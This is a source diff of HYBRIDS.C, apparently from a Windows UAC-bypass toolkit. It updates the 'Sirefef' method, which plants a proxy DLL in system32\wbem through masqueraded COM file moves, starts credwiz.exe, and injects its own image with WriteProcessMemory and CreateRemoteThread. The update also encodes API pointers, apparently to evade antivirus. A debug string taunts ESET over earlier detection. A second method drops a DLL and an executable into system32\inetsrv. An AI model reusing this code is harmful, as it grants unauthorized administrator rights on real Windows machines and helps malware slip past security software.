@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2016
+*  (C) COPYRIGHT AUTHORS, 2015 - 2017
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.51
+*  VERSION:     2.53
 *
-*  DATE:        10 July 2016
+*  DATE:        18 Jan 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -19,6 +19,7 @@
 #include "global.h"
 #include "makecab.h"
 #include "manifest.h"
+#include "sirefef.h"
 
 ELOAD_PARAMETERS_SIREFEF g_ElevParamsSirefef;
 
@@ -381,6 +382,90 @@ DWORD WINAPI ucmElevatedLaunchProc(
 }
 
 /*
+* ucmSirefefBuildControlContext
+*
+* Purpose:
+*
+* Preparations for Sirefef method.
+*
+*/
+PZA_CONTROL_CONTEXT ucmSirefefBuildControlContext(
+    VOID
+    )
+{
+    BOOL                bCond = FALSE, bSuccess = FALSE;
+    ZA_CONTROL_CONTEXT *ctx = NULL;
+    SIZE_T              sz;
+    PVOID               Routine;
+
+    
+    do {
+        sz = sizeof(ZA_CONTROL_CONTEXT);
+        NtAllocateVirtualMemory(NtCurrentProcess(), &ctx, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (ctx == NULL)
+            break;
+
+        RtlSecureZeroMemory(ctx, sz);     
+      
+        Routine = supNativeGetProcAddress(KERNEL32_DLL, "CopyFileW");
+        if (Routine == NULL)
+            break;
+        ctx->pCopyFileW = RtlEncodePointer(Routine);
+        
+        Routine = supNativeGetProcAddress(KERNEL32_DLL, "CreateRemoteThread");
+        if (Routine == NULL)
+            break;
+        ctx->pCreateRemoteThread = RtlEncodePointer(Routine);
+
+        Routine = supNativeGetProcAddress(KERNEL32_DLL, "WaitForSingleObject");
+        if (Routine == NULL)
+            break;
+        ctx->pWaitForSingleObject = RtlEncodePointer(Routine);
+
+        Routine = supNativeGetProcAddress(KERNEL32_DLL, "CreateProcessW");
+        if (Routine == NULL)
+            break;
+        ctx->pCreateProcess = RtlEncodePointer(Routine);
+
+        Routine = supNativeGetProcAddress(KERNEL32_DLL, "WriteProcessMemory");
+        if (Routine == NULL)
+            break;
+        ctx->pWriteProcessMemory = RtlEncodePointer(Routine);
+
+        Routine = supNativeGetProcAddress(NTDLL_DLL, "NtClose");
+        if (Routine == NULL)
+            break;
+        ctx->pNtClose = RtlEncodePointer(Routine);
+
+        Routine = supNativeGetProcAddress(NTDLL_DLL, "NtAllocateVirtualMemory");
+        if (Routine == NULL)
+            break;
+        ctx->pNtAllocateVirtualMemory = RtlEncodePointer(Routine);
+
+        Routine = supNativeGetProcAddress(NTDLL_DLL, "NtTerminateProcess");
+        if (Routine == NULL)
+            break;
+        ctx->pNtTerminateProcess = RtlEncodePointer(Routine);
+
+        ctx->SfCopyFile = RtlEncodePointer(ucmMasqueradedMoveFileCOM);
+        ctx->ElevatedProcedure = RtlEncodePointer(ucmElevatedLaunchProc);
+
+        ctx->ElevatedParameters = &g_ElevParamsSirefef;
+       
+        ctx->RunProcessEx = RtlEncodePointer(supRunProcessEx);
+        bSuccess = TRUE;
+
+    } while (bCond);
+
+    if (bSuccess != TRUE) {
+        sz = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), &ctx, &sz, MEM_RELEASE);
+    }
+
+    return ctx;
+}
+
+/*
 * ucmSirefefMethod
 *
 * Purpose:
@@ -391,23 +476,20 @@ DWORD WINAPI ucmElevatedLaunchProc(
 BOOL ucmSirefefMethod(
     PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
-    BOOL                      cond = FALSE, bResult = FALSE;
+    BOOL                      bResult = FALSE, bCond = FALSE;
+    ZA_CONTROL_CONTEXT       *za_ctx = NULL;
+    SIZE_T                    sz;
     DWORD                     c;
+
     HANDLE                    hProcess = NULL, hRemoteThread = NULL;
+
     HINSTANCE                 selfmodule = GetModuleHandle(NULL);
     PIMAGE_DOS_HEADER         pdosh = (PIMAGE_DOS_HEADER)selfmodule;
     PIMAGE_FILE_HEADER        fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
     PIMAGE_OPTIONAL_HEADER    opth = (PIMAGE_OPTIONAL_HEADER)((char *)fh + sizeof(IMAGE_FILE_HEADER));
     LPVOID                    remotebuffer = NULL, newEp, newDp;
-    SIZE_T                    NumberOfBytesWritten = 0;
-    ELOAD_PARAMETERS_SIREFEF *elvpar = &g_ElevParamsSirefef;
-    LPVOID                    elevproc = ucmElevatedLaunchProc;
-
-    WCHAR szBuffer[MAX_PATH * 2];
-    WCHAR szDest[MAX_PATH * 2];
-    WCHAR szSource[MAX_PATH * 2];
 
     if (
         (ProxyDll == NULL) ||
@@ -418,89 +500,105 @@ BOOL ucmSirefefMethod(
     }
 
     do {
-        //put Fubuki dll as netutils to %temp%
-        RtlSecureZeroMemory(szSource, sizeof(szSource));
-        _strcpy(szSource, g_ctx.szTempDirectory);
-        _strcat(szSource, NETUTILS_DLL);
-        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
+        za_ctx = ucmSirefefBuildControlContext();
+        if (za_ctx == NULL)
             break;
-        }
+
+        //put Fubuki dll as netutils to %temp%
+        _strcpy(za_ctx->szSource, g_ctx.szTempDirectory);
+        _strcat(za_ctx->szSource, NETUTILS_DLL);
+        if (!supWriteBufferToFile(za_ctx->szSource, ProxyDll, ProxyDllSize))
+            break;
 
         //move dll to wbem target folder
-        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szSystemDirectory);
-        _strcat(szBuffer, WBEM_DIR);
-        bResult = ucmMasqueradedMoveFileCOM(szSource, szBuffer);
-        if (!bResult) {
+        _strcpy(za_ctx->szBuffer, g_ctx.szSystemDirectory);
+        _strcat(za_ctx->szBuffer, WBEM_DIR);
+        za_ctx->SfCopyFile = RtlDecodePointer(za_ctx->SfCopyFile);
+        bResult = za_ctx->SfCopyFile(za_ctx->szSource, za_ctx->szBuffer);
+        if (!bResult)
             break;
-        }
 
         //copy 1st stage target process
-        RtlSecureZeroMemory(szSource, sizeof(szSource));
-        _strcpy(szSource, g_ctx.szSystemDirectory);
-        _strcat(szSource, CREDWIZ_EXE);
+        RtlSecureZeroMemory(za_ctx->szSource, sizeof(za_ctx->szSource));
+        _strcpy(za_ctx->szSource, g_ctx.szSystemDirectory);
+        _strcat(za_ctx->szSource, CREDWIZ_EXE);
 
-        RtlSecureZeroMemory(szDest, sizeof(szDest));
-        _strcpy(szDest, g_ctx.szTempDirectory);
-        _strcat(szDest, OOBE_EXE);
-        if (!CopyFile(szSource, szDest, FALSE)) {
+        RtlSecureZeroMemory(za_ctx->szDest, sizeof(za_ctx->szDest));
+        _strcpy(za_ctx->szDest, g_ctx.szTempDirectory);
+        _strcat(za_ctx->szDest, OOBE_EXE);
+        za_ctx->pCopyFileW = RtlDecodePointer(za_ctx->pCopyFileW);
+        if (!za_ctx->pCopyFileW(za_ctx->szSource, za_ctx->szDest, FALSE))
             break;
-        }
 
-        bResult = ucmMasqueradedMoveFileCOM(szDest, szBuffer);
-        if (!bResult) {
+        bResult = za_ctx->SfCopyFile(za_ctx->szDest, za_ctx->szBuffer);
+        if (!bResult) 
             break;
-        }
 
         //setup basic shellcode routines
-        RtlSecureZeroMemory(&g_ElevParamsSirefef, sizeof(g_ElevParamsSirefef));
-        elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
-        elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ctx.hKernel32, "WaitForSingleObject");
-        elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ctx.hKernel32, "CloseHandle");
+        za_ctx->pWaitForSingleObject = RtlDecodePointer(za_ctx->pWaitForSingleObject);
+        za_ctx->ElevatedParameters->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
+        za_ctx->ElevatedParameters->xWaitForSingleObject = (pfnWaitForSingleObject)za_ctx->pWaitForSingleObject;
+        za_ctx->pNtClose = RtlDecodePointer(za_ctx->pNtClose);
+        za_ctx->ElevatedParameters->xCloseHandle = (pfnCloseHandle)za_ctx->pNtClose;
 
         //set shellcode 2nd stage target process
         //c:\windows\system32\wbem\oobe.exe
-        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-        _strcpy(elvpar->szTargetApp, g_ctx.szSystemDirectory);
-        _strcat(elvpar->szTargetApp, WBEM_DIR);
-        _strcat(elvpar->szTargetApp, OOBE_EXE);
-        _strcpy(elvpar->szVerb, RUNAS_VERB);
+        RtlSecureZeroMemory(za_ctx->szBuffer, sizeof(za_ctx->szBuffer));
+        _strcpy(za_ctx->szBuffer, g_ctx.szSystemDirectory);
+        _strcat(za_ctx->szBuffer, WBEM_DIR);
+        _strcat(za_ctx->szBuffer, OOBE_EXE);
+        _strcpy(za_ctx->ElevatedParameters->szTargetApp, za_ctx->szBuffer);
+        _strcpy(za_ctx->ElevatedParameters->szVerb, RUNAS_VERB);
 
-        _strcpy(szBuffer, g_ctx.szSystemDirectory); //c:\windows\system32\credwiz.exe
-        _strcat(szBuffer, CREDWIZ_EXE);
+        RtlSecureZeroMemory(za_ctx->szBuffer, sizeof(za_ctx->szBuffer));
+
+        _strcpy(za_ctx->szBuffer, g_ctx.szSystemDirectory); //c:\windows\system32\credwiz.exe
+        _strcat(za_ctx->szBuffer, CREDWIZ_EXE);
 
         //run 1st stage target process
-        hProcess = supRunProcessEx(szBuffer, NULL, NULL);
-        if (hProcess == NULL) {
+        za_ctx->RunProcessEx = RtlDecodePointer(za_ctx->RunProcessEx);
+        hProcess = za_ctx->RunProcessEx(za_ctx->szBuffer, NULL, NULL, NULL);
+        if (hProcess == NULL)
             break;
-        }
+        
+        za_ctx->pNtAllocateVirtualMemory = RtlDecodePointer(za_ctx->pNtAllocateVirtualMemory);
 
-        remotebuffer = VirtualAllocEx(hProcess, NULL, (SIZE_T)opth->SizeOfImage,
-            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-        if (remotebuffer == NULL) {
+        sz = (SIZE_T)opth->SizeOfImage;
+        za_ctx->pNtAllocateVirtualMemory(hProcess, &remotebuffer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (remotebuffer == NULL) 
             break;
-        }
-        if (!WriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &NumberOfBytesWritten)) {
+
+        za_ctx->pWriteProcessMemory = RtlDecodePointer(za_ctx->pWriteProcessMemory);
+        if (!za_ctx->pWriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &sz))
             break;
+
+        za_ctx->ElevatedProcedure = RtlDecodePointer(za_ctx->ElevatedProcedure);       
+
+        newEp = (char *)remotebuffer + ((char *)za_ctx->ElevatedProcedure - (char *)selfmodule);
+        newDp = (char *)remotebuffer + ((char *)za_ctx->ElevatedParameters - (char *)selfmodule);
+
+        za_ctx->pCreateRemoteThread = RtlDecodePointer(za_ctx->pCreateRemoteThread);
+
+        hRemoteThread = za_ctx->pCreateRemoteThread(hProcess, NULL, 0, newEp, newDp, 0, &c);
+        if (hRemoteThread) {
+            za_ctx->pWaitForSingleObject(hRemoteThread, INFINITE);
+            za_ctx->pNtClose(hRemoteThread);
+            bResult = TRUE;
         }
 
-        newEp = (char *)remotebuffer + ((char *)elevproc - (char *)selfmodule);
-        newDp = (char *)remotebuffer + ((char *)elvpar - (char *)selfmodule);
+    } while (bCond);
 
-        hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, newEp, newDp, 0, &c);
-        bResult = (hRemoteThread != NULL);
-        if (bResult) {
-            WaitForSingleObject(hRemoteThread, INFINITE);
-            CloseHandle(hRemoteThread);
+    if (za_ctx != NULL) {
+        if (hProcess != NULL) {
+            za_ctx->pNtTerminateProcess = RtlDecodePointer(za_ctx->pNtTerminateProcess);
+            za_ctx->pNtTerminateProcess(hProcess, 0);
+            za_ctx->pNtClose(hProcess); //NtClose already decoded
         }
 
-    } while (cond);
-
-    if (hProcess != NULL) {
-        TerminateProcess(hProcess, 0);
-        CloseHandle(hProcess);
+        sz = 0;
+        NtFreeVirtualMemory(NtCurrentProcess(), &za_ctx, &sz, MEM_RELEASE);
     }
+
     return bResult;
 }
 
@@ -589,7 +687,7 @@ BOOL ucmGWX(
 
     PVOID Data = NULL, Ptr = NULL;
     ULONG DecompressedBufferSize = 0, DataSize = 0;
-
+    
     do {
 
         //target dir
@@ -606,22 +704,20 @@ BOOL ucmGWX(
 
         //summon some unicorns
         Ptr = supLdrQueryResourceData(KONGOU_ID, g_ctx.Peb->ImageBaseAddress, &DataSize);
-        if (Ptr == NULL) {
-            OutputDebugString(TEXT("[UCM] Resource not found"));
+        if (Ptr == NULL)
             break;
-        }
+
         Data = DecompressPayload(Ptr, DataSize, &DecompressedBufferSize);
         if (Data == NULL)
             break;
-
+        
         //write proxy dll to disk
         RtlSecureZeroMemory(szSource, sizeof(szSource));
         _strcpy(szSource, g_ctx.szTempDirectory);
         _strcat(szSource, SLC_DLL);
-        if (!supWriteBufferToFile(szSource, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+        if (!supWriteBufferToFile(szSource, g_ctx.PayloadDll, g_ctx.PayloadDllSize))
             break;
-        }
-
+        
         //drop fubuki to system32\inetsrv
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx.szSystemDirectory);
@@ -630,12 +726,12 @@ BOOL ucmGWX(
         if (!bResult) {
             break;
         }
-
+        
         //put target app
         RtlSecureZeroMemory(szSource, sizeof(szSource));
         _strcpy(szSource, g_ctx.szTempDirectory);
         _strcat(szSource, INETMGR_EXE);
-
+        
         //write app to disk
         if (!supWriteBufferToFile(szSource, Data, DecompressedBufferSize)) {
             break;
@@ -646,14 +742,14 @@ BOOL ucmGWX(
         if (!bResult) {
             break;
         }
-
+        
         _strcpy(szTargetApp, szDest);
         _strcat(szTargetApp, INETMGR_EXE);
         bResult = supRunProcess(szTargetApp, NULL);
         if (bResult) {
-            OutputDebugString(TEXT("Whoever created this gwx shit must be fired"));
+            OutputDebugString(TEXT("Next time be more creative ESET"));
         }
-
+        
     } while (cond);
 
     if (Data != NULL) {
